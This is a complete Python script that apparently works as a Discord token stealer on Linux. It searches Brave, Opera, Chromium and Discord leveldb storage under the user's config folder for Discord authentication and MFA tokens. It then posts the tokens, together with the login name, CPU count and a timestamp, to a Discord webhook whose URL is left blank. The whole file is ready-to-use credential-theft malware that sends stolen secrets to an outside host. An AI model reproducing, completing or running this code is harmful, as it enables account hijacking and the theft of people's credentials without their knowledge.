import re
import os
import sys
import json
import urllib3
import datetime
from urllib3 import request
from datetime import datetime

webhook_url = ""


def get_dirs() -> list:
    """ This function finds all paths where discord tokens can be stored """
    base_path = f"/home/{os.getlogin()}/.config"
    leveldb_paths = [
        f"{base_path}/BraveSoftware/Brave-Browser/Default/Local Storage/leveldb",
        f"{base_path}/opera/Local Storage/leveldb",
        f"{base_path}/chromium/Default/Local Storage/leveldb",
    ]

    leveldb_paths += [
        f"{base_path}/{i}/Local Storage/leveldb"
        for i in os.listdir(base_path)
        if "discord" in i.lower()
        and os.path.isdir(f"{base_path}/{i}/Local Storage/leveldb")
    ]

    return leveldb_paths


def find_files() -> list:
    """ 
    This function filters out all possible files that dont end with .ldb 
    (LDB files store discord tokens) 
    """
    token_dirs = get_dirs()
    ldb_files = []
    for i in token_dirs:
        try:
            for f in os.listdir(i):
                if f.endswith(".ldb"):
                    ldb_files.append(f"{i}/{f}")
        except:
            pass

    return ldb_files


def scan_files() -> list:
    """ This function uses regex to scan for a discord token's pattern inside ldb files """
    file_dirs = find_files()
    final_tokens = []
    for i in file_dirs:
        with open(i, errors="ignore") as file:
            for line in file.readlines():
                for token_regex in (
                    r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",
                    r"mfa\.[\w-]{84}",
                ):
                    for token in re.findall(token_regex, line.strip()):
                        final_tokens.append(token)

    return final_tokens


def main() -> None:
    token_list = scan_files()
    webhook_pool = urllib3.PoolManager()
    webhook_headers = {"Content-Type": "application/json"}
    webhook_tokens = [
        {"name": f"Token #{count}", "value": f"`{i}`"}
        for count, i in enumerate(token_list)
    ]

    webhook_body = {
        "embeds": [
            {
                "title": "Hey, Tokens Were Found",
                "description": f"""
            ```
UTC Date: {datetime.utcnow()}
PC Username: {os.getlogin()}
CPU Count: {os.cpu_count()}```
            """,
                "color": 0xFF0505,
                "fields": webhook_tokens,
            }
        ]
    }

    webhook_request = webhook_pool.request(
        "POST",
        webhook_url,
        body=json.dumps(webhook_body).encode("utf-8"),
        headers=webhook_headers,
    )


if __name__ == "__main__":
    main()
